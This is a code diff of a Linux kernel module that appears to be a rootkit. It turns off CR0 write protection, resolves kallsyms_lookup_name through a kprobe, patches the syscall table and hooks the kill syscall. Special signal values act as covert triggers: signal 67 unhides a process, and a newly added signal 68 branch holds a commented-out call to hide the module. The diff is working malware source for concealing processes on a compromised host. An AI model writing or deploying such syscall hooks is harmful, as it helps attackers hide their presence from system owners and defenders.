@@ -1,23 +1,14 @@
-#include <linux/module.h>
-#include <linux/kernel.h>
-#include <linux/init.h>
-#include <linux/syscalls.h>
-#include <asm/special_insns.h>
-#include <linux/kprobes.h>
-#include <linux/kallsyms.h>
-#include "process.h"
+#include "hooks.h"
 
-static inline void write_cr0_my(int);
-void my_hook_kill(void);
-void my_unregister_hook_kill(void);
-typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
-kallsyms_lookup_name_t my_kallsyms_lookup_name =NULL;
+kallsyms_lookup_name_t my_kallsyms_lookup_name=NULL;
+unsigned long __lkm_order;
+t_syscall my_pre_sys_kill=NULL;
+struct kprobe kp={
+  .symbol_name="kallsyms_lookup_name",
+};
+unsigned long *__sys_call_table;
 
-int noop_pre(struct kprobe *p ,struct pt_regs *regs);
 
-static unsigned long __lkm_order;
-typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
-static t_syscall my_pre_sys_kill=NULL;
 void write_cr0_my(int a){
   //Let's close the cr0 write protection
   unsigned long cr0;
@@ -36,10 +27,6 @@ void write_cr0_my(int a){
 int noop_pre(struct kprobe *p ,struct pt_regs *regs){
   return 0;
 }
-static struct kprobe kp={
-  .symbol_name="kallsyms_lookup_name",
-};
-asmlinkage int hook_tar_kill(const struct pt_regs *);
 asmlinkage int hook_tar_kill(const struct pt_regs *pt){
   pid_t pid=(pid_t) pt->di;
   int sig=(int)pt->si;
@@ -73,12 +60,13 @@ asmlinkage int hook_tar_kill(const struct pt_regs *pt){
   }else if(pid==0&&sig==67){
     recover_hide_pid(current->pid);
     return 0;
-  }else{
-    //Let's call the real kill syscall but Do you know whether another LKM hook it? I don't know either.
-    return (*my_pre_sys_kill)(pt);
+  }else if(pid==0&&sig==68){
+  //  hide_module();
   }
+  //Let's call the real kill syscall but Do you know whether another LKM hook it? I don't know either.
+  return (*my_pre_sys_kill)(pt);
 }
-static unsigned long *__sys_call_table;
+
 void my_hook_kill(void){
   register_kprobe(&kp);
   my_kallsyms_lookup_name=(kallsyms_lookup_name_t)kp.addr;
